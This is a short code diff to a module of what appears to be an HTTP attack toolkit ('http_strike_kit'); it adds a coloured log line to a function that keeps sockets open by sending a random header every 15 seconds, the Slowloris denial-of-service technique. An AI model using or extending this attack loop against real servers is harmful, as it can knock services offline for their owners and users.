@@ -2,6 +2,8 @@ import random
 import socket
 import time
 
+import typer
+
 from http_strike_kit.utils.thread_exec import ThreadedExecutor
 
 
@@ -17,6 +19,7 @@ def _send_slowloris_request(target: str, port: int, timeout: float):
         while True:
             try:
                 time.sleep(15)
+                typer.echo(typer.style(f"Sending packet {target}:{port}", fg=typer.colors.BRIGHT_BLACK))
                 s.send(f"X-a: {random.randint(1, 5000)}\r\n".encode("utf-8"))
             except socket.error:
                 break
